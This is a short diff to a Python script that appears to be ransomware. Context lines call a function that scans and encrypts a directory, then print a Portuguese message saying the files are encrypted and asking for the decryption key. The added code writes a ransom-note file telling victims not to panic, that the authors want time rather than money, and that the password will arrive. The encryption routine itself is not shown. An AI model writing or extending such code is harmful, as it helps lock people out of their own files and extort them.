@@ -22,8 +22,20 @@ if __name__ == "__main__":
     scan_and_encrypt(directory, key)
 
     print(
-        "Criptografia concluída. Agora, forneça a chave para descriptografar os arquivos."
-    )
+            "Criptografia concluída. Agora, forneça a chave para descriptografar os arquivos."
+            )
+
+    file_name = "novo_arquivo.txt"
+
+    try:
+        # Usando o modo 'x' para criar o arquivo (gera erro se o arquivo já existir)
+        with open(file_name, 'x') as file:
+            file.write("Instrucoes: .\n")
+            file.write("Na verdade nao tem muitas, apenas aguarde, nao precisa de panico .\n")
+            file.write("Nao queremos dinheiro, queremos so tempo.\n")
+            file.write("So aguarda, a senha chegara para voces.\n")
+    except FileExistsError:
+        print(f"Erro: O arquivo '{file_name}' já existe.")
 
     decryption_key = ask_for_key()
 
